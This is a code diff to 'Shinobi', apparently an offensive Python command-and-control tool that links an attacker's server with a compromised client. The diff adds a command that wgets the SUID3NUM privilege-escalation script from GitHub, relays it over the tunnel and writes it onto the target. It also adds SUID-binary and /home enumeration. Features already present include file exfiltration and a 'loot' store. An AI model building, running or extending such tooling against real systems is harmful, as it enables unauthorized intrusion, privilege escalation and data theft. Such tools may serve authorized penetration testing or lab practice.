@@ -193,6 +193,7 @@ def displayHelpInfo():
 	print("ssdownload <exploit path> \t\tdownloads a search sploit exploit from your attacking machine")
 	print("download <url> \t\t\t\tdoes a wget for your file on your attacking machine and then transfers it to you over shinobi tunnel")
 	print("linenum\t\t\t\t\tdownlods linenum.sh to the Shinobi Server and then transfers it back to the client")
+	print("suid3num\t\t\t\tdownloads suid3num.py to the Shinobi server and then transfers it back to the client")
 	lb()
 	print("Loot Chest:")
 	lb()
@@ -257,7 +258,24 @@ def linenumDownload(connection,command):
 	result = getResult(connection)
 	print("File Transfer Completed!")
 	filename = "linenum.sh"
-	print("Creating file localy")
+	print("Creating file locally")
+	file = open(filename,'wb')
+	print("Writing File")
+	file.write(result)
+	print("File write completed")
+	lb()
+
+def suid3numDownload(connection,command):
+	print("Requesting file from Shinobi Server. Standby for results...")
+	try:
+		sendCommand(connection,command)
+	except:
+		print("There was an exception while requesting your file")
+
+	result = getResult(connection)
+	print("File Transfer Completed!")
+	filename = "suid3num.py"
+	print("Creating file locally")
 	file = open(filename,'wb')
 	print("Writing File")
 	file.write(result)
@@ -305,6 +323,12 @@ def displayMachineInfo():
 	lb()
 	print("Current root processes:")
 	runCommand("ps aux | grep root")
+	lb()
+	print("SUID")
+	runCommand("find / -perm -u=s 2>/dev/null")
+	lb()
+	print("/home directory")
+	runCommand("ls -la /home")
 	lb()
 
 #Attempts to run a searchsploit command on the Shinobi Server with the passed in search criteria, then displays it to the user
@@ -467,6 +491,8 @@ def handleCommand(connection,command):
 		downloadFile(connection,command)
 	elif("linenum" in command[:7]):
 		linenumDownload(connection,command)
+	elif("suid3num" in command[:8]):
+		suid3numDownload(connection,command)
 	elif("exfil" in command[:5]):
 		exfiltrateFile(connection,command)
 	elif("loot store" in command[:10]):
@@ -610,6 +636,15 @@ def listenerHandler(buf,conn,address):
 			sendCommand(conn,file)
 		except:
 			print("There was an error while downloading and sending your file back to the client")
+
+	elif("suid3num" in buf):
+		print("executing suid3num download and return commend")
+		url = "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py"
+		try:
+			file = os.popen("wget -O- " + url).read()
+			sendCommand(conn,file)
+		except:
+			print("There was en error while downloading and sending your file back to the client")
 
 	elif("syncLoot" in buf):
 		print("Syncing Loot")
